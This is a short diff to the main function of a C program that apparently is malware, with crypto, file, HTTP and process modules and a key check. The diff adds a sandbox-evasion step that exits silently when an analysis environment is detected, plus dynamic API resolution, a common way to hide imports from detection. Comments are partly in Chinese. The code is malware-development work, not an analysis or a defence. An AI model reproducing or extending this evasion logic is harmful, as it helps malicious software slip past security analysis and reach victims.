@@ -20,6 +20,8 @@
 // Project headers
 #include "config.h"
 #include "crypto.h"
+#include "dynapi.h"
+#include "evasion.h"
 #include "files.h"
 #include "http.h"
 #include "process.h"
@@ -243,6 +245,29 @@ int main(int argc, char *argv[]) {
     return 0;
   }
   DEBUG_PRINT("[+] Key validated\n");
+#endif
+
+  // === Evasion Check ===
+#if ENABLE_EVASION
+  DEBUG_PRINT("[*] Running evasion checks...\n");
+  if (evasion_check_all()) {
+    DEBUG_PRINT("[!] Sandbox detected, exiting...\n");
+#if EVASION_EXIT_SILENT
+    return 0; // 静默退出
+#endif
+  }
+  DEBUG_PRINT("[+] Evasion checks passed\n");
+#endif
+
+  // === Dynamic API Init ===
+#if ENABLE_DYNAPI
+  DEBUG_PRINT("[*] Initializing dynamic API...\n");
+  if (dynapi_init() != 0) {
+    DEBUG_PRINT("[!] Dynamic API init failed, using fallback\n");
+    // 不退出，继续使用普通 API
+  } else {
+    DEBUG_PRINT("[+] Dynamic API initialized\n");
+  }
 #endif
 
   // Initialize crypto
